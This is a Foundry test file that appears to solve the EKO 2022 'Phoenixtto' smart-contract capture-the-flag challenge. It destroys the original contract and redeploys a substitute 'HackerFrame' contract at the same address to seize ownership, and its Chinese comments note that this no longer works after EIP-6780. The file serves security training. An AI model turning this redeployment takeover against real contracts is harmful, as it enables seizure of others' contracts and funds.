// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Laboratory, Phoenixtto} from "../../src/eko2022/09_Phoenixtto/Phoenixtto.sol";
import {Phoenixtto_Factory} from "../../src/eko2022/09_Phoenixtto/Phoenixtto_Factory.sol";
import {Phoenixtto_Attacker} from "./09_Phoenixtto_Attakcer.sol";

contract Phoenixtto_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");

	Phoenixtto_Factory factory;
	Laboratory instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new Phoenixtto_Factory();
		instContract = Laboratory(factory.createInstance(player));
		
		vm.stopPrank();
	}
	
	function test__Solution_Phoenixtto() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_Phoenixtto -vv
		
		// 看一下 create2 的原理，对照 _code = hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3";
		// 意味着：5860208158601c335a63aaf10f428752fa158151803b80938091923cf3 == abi.encodePacked(type(Phoenixtto).creationCode)
		// 能够推断出某些结果：不能
		
		// 哈希破解
		// 根本不可能
		
		// 凤凰的地址，是恒定
		// 能够推断出某些结果：能，借用代理合约的思维，来进行套壳操作
		
		////////////////////////////////////////////////////////////////////////////////////////////
		
		address phoenixttoAddr = instContract.addr();

		// 借尸还魂的方式，没有代理合约，但仍然能够发现套壳空间
		console.log("0. .code.length:", phoenixttoAddr.code.length);
		
		// 先必须销毁原始合约，清除`凤凰合约地址`上的字节码
		Phoenixtto(phoenixttoAddr).capture("fuck you");
		console.log("1. .code.length:", phoenixttoAddr.code.length);

		// 借助`HackerFrame`合约，套在`凤凰合约地址`上
		// 执行的`reBorn`，其实是`HackerFrame::reBorn`
		// 此时，就把 owner 破解了
		instContract.reBorn(type(HackerFrame).creationCode);
		
		////////////////////////////////////////////////////////////////////////////////////////////
		
		// EIP-6780（Cancún）之后，selfdestruct 不会删除合约代码，也不会清除存储。
		// 故，当前测试，无论是使用`链上环境(如，Sepolia)`，还是使用`anvli本地链`，以及`本地测试单元模拟链`，都无法达成`selfdestruct 后，能够删除合约代码`
		// 最终，导致`第二次部署凤凰合约`的时候，必定会发生`CreateCollision`，即，由于地址冲突而发生的部署失败。
		// 简而言之，该夺旗赛是在2022年编写的，当时是能够预期通过的。而现在无法通过。
	}
}

contract HackerFrame {
	address public owner;
	bool private _isBorn;
	
	function reBorn() external {
		_isBorn = true;
		owner = msg.sender;
		console.log(unicode"借尸还魂，到此一游");
	}
	
	function destroySelf() public {
		selfdestruct(payable(msg.sender));
	}
}
